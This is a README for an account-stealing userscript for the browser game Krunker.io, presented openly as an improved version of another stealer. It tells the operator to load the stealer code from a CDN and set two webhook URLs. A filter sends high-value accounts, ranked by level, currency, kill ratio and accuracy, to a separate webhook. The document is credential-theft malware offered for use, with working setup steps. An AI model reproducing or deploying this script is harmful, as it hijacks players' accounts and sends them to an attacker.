# Z3Dline

An improved version of PTWline stealer for Krunker.io.

# Usage

- `@require` The script in your userscript header.
- You also need to require `jsonpack` and `msgpack-lite`, see example below.
- Replace the `LO_WEBHOOK_URL` and `HI_WEBHOOK_URL` with your own webhook URLs.
- You can also change the `HI_FILTER` to set which accounts will go to the High-Tier Webhook. ONLY ACCOUNTS MATCHING ALL THE FILTERS WILL BE SENT TO THE HIGH-TIER WEBHOOK.

```js
// ==UserScript==
// @name         Z3DLine
// @description  Krunker Account Stealer
// @version      1.0.0
// @author       z3db0y
// @match        *://*.krunker.io/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=krunker.io
// @grant        none
// @run-at       document-start
// @require      https://unpkg.com/jsonpack
// @require      https://unpkg.com/msgpack-lite/dist/msgpack.min.js
// @require      https://cdn.jsdelivr.net/gh/z3db0y/Z3Dline/dist.js
// ==/UserScript==

window.LO_WEBHOOK_URL = '';
window.HI_WEBHOOK_URL = '';
window.HI_FILTER = {
    lvl: 0,
    kr: 0,
    kdr: 0,
    nukes: 0,
    accuracy: 0
};
```